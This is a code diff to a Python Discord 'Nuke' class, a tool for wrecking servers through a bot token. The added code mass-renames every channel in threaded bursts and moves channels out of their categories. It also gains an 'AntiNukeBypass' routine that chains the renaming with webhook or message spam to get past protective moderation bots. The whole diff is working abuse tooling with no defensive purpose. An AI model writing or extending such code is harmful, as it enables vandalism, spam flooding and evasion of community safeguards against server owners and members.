@@ -240,9 +240,7 @@ class Nuke:
         
         return True
 
-    def SpamWebhooks2(self):
-        msg = Logging.inp('Spam', 'Message')
-        amount = int(Logging.inp('Spam', 'Amount'))
+    def SpamWebhooks2(self, msg, amount):
 
         wbh = self.wbh
         tkn = self.tkn
@@ -534,13 +532,80 @@ class Nuke:
             r = requests.patch(f'https://discord.com/api/v9/guilds/{self.serverid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
             if r.status_code in [200, 201, 204]:
                 Logging.success('Successfully disabled community mode')
-            elif r.status_code == 420:
+            elif r.status_code == 429:
                 Logging.info('Rate limit response while trying to disable community mode')
             else:
                 Logging.fail(f'Failed to disable community mode: {r.status_code} - {r.text}')
                 
         except Exception as e:
             Logging.fail(f'Failed to disable community mode: {e}')
+
+    def modchannel(self, id, name):
+        payload = {
+        'name': name,
+        }
+        r = requests.patch(f'https://discord.com/api/v9/channels/{id}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+        if r.status_code in [200, 201, 204]:
+            Logging.success(f'Successfully renamed channel {id}')
+        elif r.status_code == 429:
+            Logging.info('Rate limit response while trying to modify channel')
+        else:
+            Logging.fail(f'Failed to modify channel: {r.status_code} - {r.text}')
+
+    def modchannel2(self, id, name, cate=None):
+        payload = {
+        'name': name,
+        'parent_id': cate
+        }
+        r = requests.patch(f'https://discord.com/api/v9/channels/{id}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)    
+        if r.status_code in [200, 201, 204]:
+            Logging.success(f'Successfully modified channel {id}')
+        elif r.status_code == 429:
+            Logging.info('Rate limit response while trying to modify channel')
+        else:
+            Logging.fail(f'Failed to modify channel: {r.status_code} - {r.text}')
+
+
+    def MassRename(self, name, type):
+        channels = self.getchannels(self.serverid)
+        if type == 1:
+            threads = []
+
+            for channel in channels:
+                t = threading.Thread(target=self.modchannel, args=(channel['id'], name,))
+                threads.append(t)
+                t.start()
+                time.sleep(0.01)
             
-    def AntiNukeBypass(self, msg):
-        Logging.info('WIP')
+            for t in threads:
+                t.join()
+        elif type == 2:
+            threads = []
+
+            for channel in channels:
+                t = threading.Thread(target=self.modchannel2, args=(channel['id'], name, None,))
+                threads.append(t)
+                t.start()
+                time.sleep(0.01)
+            
+            for t in threads:
+                t.join()
+
+    def AntiNukeBypass(self, name, msg, amount, antype=0):
+        if antype == 0:
+            type = 'Basic'
+        elif antype == 1:
+            type = 'No Webhooks'
+        elif antype == 2:
+            type = 'No Rename'
+        
+        if type.lower() == 'basic':
+            self.MassRename(name, 2)
+            self.SpamWebhooks2(msg, amount)
+        
+        elif type.lower() == 'no webhooks':
+            self.MassRename(name, 2)
+            self.Spam2(msg, amount)
+        
+        elif type.lower() == 'no rename':
+            self.SpamWebhooks2(msg, amount)
